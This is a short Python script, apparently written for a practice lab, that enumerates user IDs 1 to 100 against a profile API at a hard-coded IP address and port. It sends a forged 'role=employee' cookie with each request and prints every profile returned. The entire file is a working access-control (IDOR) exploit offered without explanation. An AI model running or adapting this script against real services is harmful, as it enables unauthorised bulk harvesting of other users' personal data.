import requests
import json

base_url = 'http://94.237.63.201:52538/profile/api.php/profile/'

def fetch_user_info(user_id):
    url = f"{base_url}{user_id}"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://94.237.63.201:52538/profile/index.php',
        'Content-Type': 'application/json',
        'Origin': 'http://94.237.63.201:52538',
        'DNT': '1',
        'Connection': 'close',
        'Cookie': 'role=employee',
        'Sec-GPC': '1'
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        try:
            user_data = response.json()
            print(json.dumps(user_data, indent=4))
        except json.JSONDecodeError:
            print(f"Failed to decode JSON response for user ID {user_id}")
    else:
        print(f"Failed to fetch data for user ID {user_id}. Status code: {response.status_code}")

def enumerate_users(start_id, end_id):
    for user_id in range(start_id, end_id + 1):
        fetch_user_info(user_id)

start_id = 1
end_id = 100

enumerate_users(start_id, end_id)
